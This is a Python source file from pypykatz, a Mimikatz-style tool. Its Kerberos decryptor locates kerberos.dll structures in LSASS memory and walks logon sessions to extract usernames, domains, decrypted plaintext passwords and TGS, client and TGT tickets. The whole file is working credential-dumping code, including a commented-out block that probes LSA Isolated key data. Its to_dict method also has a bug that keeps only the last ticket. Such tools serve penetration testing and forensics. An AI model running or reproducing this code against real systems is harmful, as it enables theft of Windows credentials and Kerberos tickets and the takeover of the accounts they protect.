#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io

from pypykatz.commons.common import *
from pypykatz.commons.filetime import *
from pypykatz.commons.kerberosticket import *
from .templates import *
from pypykatz.lsadecryptor.package_commons import *

class KerberosCredential:
	def __init__(self):
		self.credtype = 'kerberos'
		self.username = None
		self.password = None
		self.domainname = None
		self.luid = None
		self.tickets = []
		
	def __str__(self):
		t = '\t== Kerberos ==\n'
		t += '\t\tUsername: %s\n' % self.username
		t += '\t\tDomain: %s\n' % self.domainname
		t += '\t\tPassword: %s\n' % self.password
		for ticket in self.tickets:
			t += '\t\t%s' % str(ticket).replace('\n','\n\t\t\t')[:-3]
		
		return t
		
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['password'] = self.password
		t['domainname'] = self.domainname
		t['luid'] = self.luid
		t['tickets'] = []
		for ticket in self.tickets:
			t['tickets'] = ticket.to_dict()
		
		return t
		

class KerberosDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor, sysinfo):
		super().__init__('Kerberos', lsa_decryptor, sysinfo, reader)
		self.decryptor_template = decryptor_template
		self.credentials = []
		
		self.current_ticket_type = None
		self.current_cred = None

	def find_first_entry(self):
		position = self.find_signature('kerberos.dll',self.decryptor_template.signature)
		ptr_entry_loc = self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
	
	def handle_ticket(self, kerberos_ticket):
		try:
			kt = KerberosTicket.parse(kerberos_ticket, self.reader, self.decryptor_template.sysinfo, self.current_ticket_type)
			self.current_cred.tickets.append(kt)
			#print(str(kt))
		except Exception as e:
			raise e
	
	def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = self.find_first_entry()
		except Exception as e:
			self.log('Failed to find structs! Reason: %s' % e)
			return
			
		if self.sysinfo.major_version < 6:
			raise NotImplementedError("Maybe implemented later")
		else:
			result_ptr_list = []
			self.reader.move(entry_ptr_value)
			start_node = PRTL_AVL_TABLE(self.reader).read(self.reader)
			self.walk_avl(start_node.BalancedRoot.RightChild, result_ptr_list)
			
			for ptr in result_ptr_list:
				self.log_ptr(ptr, self.decryptor_template.kerberos_session_struct.__name__)
				self.reader.move(ptr)
				kerberos_logon_session = self.decryptor_template.kerberos_session_struct(self.reader)
				self.current_cred = KerberosCredential()
				self.current_cred.luid = kerberos_logon_session.LocallyUniqueIdentifier
				
				self.current_cred.username = kerberos_logon_session.credentials.UserName.read_string(self.reader)
				self.current_cred.domainname = kerberos_logon_session.credentials.Domaine.read_string(self.reader)
				self.current_cred.password = self.decrypt_password(kerberos_logon_session.credentials.Password.read_maxdata(self.reader))
				
				#### key list (still in session) this is not a linked list (thank god!)
				if kerberos_logon_session.pKeyList.value != 0:
					key_list = kerberos_logon_session.pKeyList.read(self.reader, override_finaltype = self.decryptor_template.keys_list_struct)
					#print(key_list.cbItem)
					key_list.read(self.reader, self.decryptor_template.hash_password_struct)
					for key in key_list.KeyEntries:
						pass
						#print(key.generic.Checksump.value)
						
						#self.log_ptr(key.generic.Checksump.value, 'Checksump', datasize = key.generic.Size)
						#if self.reader.reader.sysinfo.BuildNumber < WindowsBuild.WIN_10_1507.value and key.generic.Size > LSAISO_DATA_BLOB.size:
						#	if key.generic.Size <= LSAISO_DATA_BLOB.size + (len("KerberosKey") - 1) + 32: #AES_256_KEY_LENGTH
						#		input('1')
						#		data_blob = key.generic.Checksump.read(self.reader, override_finaltype = LSAISO_DATA_BLOB)
						#		data_blob.read(self.reader, key.generic.Size - LSAISO_DATA_BLOB.size)
						#		
						#		input('data blob end')
						#		"""
						#		kprintf(L"\n\t   * LSA Isolated Data: %.*S", blob->typeSize, blob->data);
						#		kprintf(L"\n\t     Unk-Key  : "); kull_m_string_wprintf_hex(blob->unkKeyData, sizeof(blob->unkKeyData), 0);
						#		kprintf(L"\n\t     Encrypted: "); kull_m_string_wprintf_hex(blob->data + blob->typeSize, blob->origSize, 0);
						#		kprintf(L"\n\t\t   SS:%u, TS:%u, DS:%u", blob->structSize, blob->typeSize, blob->origSize);
						#		kprintf(L"\n\t\t   0:0x%x, 1:0x%x, 2:0x%x, 3:0x%x, 4:0x%x, E:", blob->unk0, blob->unk1, blob->unk2, blob->unk3, blob->unk4);
						#		kull_m_string_wprintf_hex(blob->unkData2, sizeof(blob->unkData2), 0); kprintf(L", 5:0x%x", blob->unk5);
						#		"""
						#	else:
						#		input('2')
						#		key.generic.Checksump.read(self.reader, override_finaltype = LSAISO_DATA_BLOB)
						#		print('unkData1 : %s' % data_struct.unkData1.hex())
						#		print('unkData2 : %s' % data_struct.unkData2.hex())
						#		print('Encrypted : %s' % data_struct.data.hex()) #another extra struct should wrap this data! ENC_LSAISO_DATA_BLOB
						#		
						#else:
						#	
						#	if self.reader.reader.sysinfo.BuildNumber < WindowsBuild.WIN_VISTA.value:
						#		input('3')
						#		key.generic.Checksump.read(self.reader, override_finaltype = LSAISO_DATA_BLOB)
						#		print('unkData1 : %s' % data_struct.unkData1.hex())
						#		print('unkData2 : %s' % data_struct.unkData2.hex())
						#		print('Encrypted : %s' % data_struct.data.hex()) #another extra struct should wrap this data! ENC_LSAISO_DATA_BLOB
						#		
						#	else:
						#		input('4')
						#		#we need to decrypt as well!
						#		self.reader.move(key.generic.Checksump.value)
						#		enc_data = self.reader.read(key.generic.Size)
						#		print(hexdump(enc_data))
						#		dec_data = self.lsa_decryptor.decrypt(enc_data)
						#		print(hexdump(dec_data))
						#		t_reader = GenericReader(dec_data)
						#		data_struct = LSAISO_DATA_BLOB(t_reader)
						#		print('unkData1 : %s' % data_struct.unkData1.hex())
						#		print('unkData2 : %s' % data_struct.unkData2.hex())
						#		print('Encrypted : %s' % data_struct.data.hex()) #another extra struct should wrap this data! ENC_LSAISO_DATA_BLOB
						#
						#input()
				
				
				# getting ticket granting service tickets
				#print(kerberos_logon_session.Tickets_1.Flink.value)
				#print(kerberos_logon_session.Tickets_1.Flink.location)
				#input('Check!')
				if kerberos_logon_session.Tickets_1.Flink.value != 0 and \
						kerberos_logon_session.Tickets_1.Flink.value != kerberos_logon_session.Tickets_1.Flink.location and \
							kerberos_logon_session.Tickets_1.Flink.value != kerberos_logon_session.Tickets_1.Flink.location - 4 :
					self.current_ticket_type = KerberosTicketType.TGS
					self.walk_list(kerberos_logon_session.Tickets_1.Flink, self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
				
				if kerberos_logon_session.Tickets_2.Flink.value != 0 and \
						kerberos_logon_session.Tickets_2.Flink.value != kerberos_logon_session.Tickets_2.Flink.location and \
							kerberos_logon_session.Tickets_2.Flink.value != kerberos_logon_session.Tickets_2.Flink.location - 4 :
					self.current_ticket_type = KerberosTicketType.CLIENT
					self.walk_list(kerberos_logon_session.Tickets_2.Flink,self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
				
				if kerberos_logon_session.Tickets_3.Flink.value != 0 and \
						kerberos_logon_session.Tickets_3.Flink.value != kerberos_logon_session.Tickets_3.Flink.location and \
							kerberos_logon_session.Tickets_3.Flink.value != kerberos_logon_session.Tickets_3.Flink.location - 4 :
					self.current_ticket_type = KerberosTicketType.TGT
					self.walk_list(kerberos_logon_session.Tickets_3.Flink,self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
				self.current_ticket_type = None
				self.credentials.append(self.current_cred)
			
	